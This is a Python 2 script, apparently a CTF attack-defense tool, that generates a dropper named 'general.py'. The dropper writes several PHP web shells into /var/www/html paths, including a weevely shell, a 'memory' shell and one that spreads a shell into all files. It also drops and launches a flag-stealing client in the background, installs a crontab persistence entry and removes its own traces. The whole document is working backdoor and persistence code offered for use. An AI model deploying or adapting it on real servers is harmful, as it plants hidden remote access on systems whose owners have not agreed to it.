
f=open(r'general.py','w')

f1_name='khelper'   #getFlag py
f1_path='py_path'
f2_name='.host_config.php'  #memory php     
f2_path='web_config'
f3_name='qpxm.php'  #write shell to all files
f3_path='web_plugin'
f4_name='asset.php' #small shell
f4_path='web_vul_path'
f5_name='weevely.php'   #weevely shell
f5_path='web_vul_path'
f6_name='1' #crontab
f6_path='py_path'
f6_shell=r'*/5 * * * * whoami\x0a'   #crontab file must contains 0x0a to be installed

php_path=r'php'
f1=open(r'./getFlag/client.py','r').read()
f2=open(r'./%s/.host_config.php'%(php_path,),'r').read()
f3=open(r'./%s/qpxm.php'%(php_path,),'r').read()
f4=open(r'./%s/asset.php'%(php_path,),'r').read()
f5=open(r'./%s/witconfig.php'%(php_path,),'r').read()

f.write('''#!/usr/bin/python
import os
import subprocess
import time
''')

f.write('''
web_home=r'/var/www/html'   #absolute path
web_config=web_home+os.sep+'config'
web_vul_path=web_home+os.sep+'admin'
web_plugin=web_home+os.sep+'plugins'
py_path=r'/tmp'
''')    #change the path if needed

f.write('''
f1_name='%s'
f1_path=%s
f2_name='%s'
f2_path=%s
f3_name='%s'
f3_path=%s
f4_name='%s'
f4_path=%s
f5_name='%s'
f5_path=%s
f6_name='%s'
f6_path=%s
'''%(f1_name,f1_path,f2_name,f2_path,f3_name,f3_path,f4_name,f4_path,f5_name,f5_path,f6_name,f6_path))

f.write('''
f1=\'\'\'%s\'\'\'
'''%(f1,))
f.write('''
f2=\'\'\'%s\'\'\'
'''%(f2,))
f.write('''
f3=\'\'\'%s\'\'\'
'''%(f3,))
f.write('''
f4=\'\'\'%s\'\'\'
'''%(f4,))
f.write('''
f5=\'\'\'%s\'\'\'
'''%(f5,))
f.write('''
f6_shell=\"%s\"
'''%(f6_shell,))

f.write('''
open(f1_path+os.sep+f1_name,'w').write(f1)
subprocess.call("chmod a+x %s"%(f1_path+os.sep+f1_name,),shell=True)
open(f2_path+os.sep+f2_name,'w').write(f2)
open(f3_path+os.sep+f3_name,'w').write(f3)
open(f4_path+os.sep+f4_name,'w').write(f4)
open(f5_path+os.sep+f5_name,'w').write(f5)
open(f6_path+os.sep+f6_name,'wb').write(f6_shell)

subprocess.call("crontab %s"%(f6_path+os.sep+f6_name,),shell=True)
time.sleep(1)
#subprocess.call("rm %s"%(f6_path+os.sep+f6_name,),shell=True)

subprocess.call("nohup %s %s &"%(f1_path+os.sep+f1_name,"--mode automatic"),shell=True)
time.sleep(1)
subprocess.call("rm %s"%(py_path+os.sep+f1_name,),shell=True)

#delete self
# os.remove(__file__)
print __file__
''')
f.close()